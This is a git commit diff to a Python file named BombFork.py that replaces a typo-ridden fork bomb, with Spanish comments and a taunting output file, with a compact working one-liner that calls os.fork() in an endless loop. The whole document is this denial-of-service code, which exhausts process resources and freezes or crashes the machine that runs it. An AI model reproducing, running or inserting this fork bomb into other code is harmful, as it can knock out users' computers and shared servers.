0ff95b6f328dc16b9f601e4f44d06b5d494ff43b
Desmon <61366533+desmonHak@users.noreply.github.com>
2021-10-15 01:04:06 +0200

    Update BombFork.py

--- BombFork.py
+++ BombFork.py
@@ -1,7 +1,1 @@
-import os
-
-while True: #buclle infinito para cear procesos constantemente.
-    of.fork() #funcion que crea un proceso, esto se repitira infinitamente asta saturar la pc.
-    file = open("Hacke mate?", "w")
-    file.write("la bomba fork no finalizo por motivos desconocidos")
-    file.close()
+from os import fork;while True:fork() 
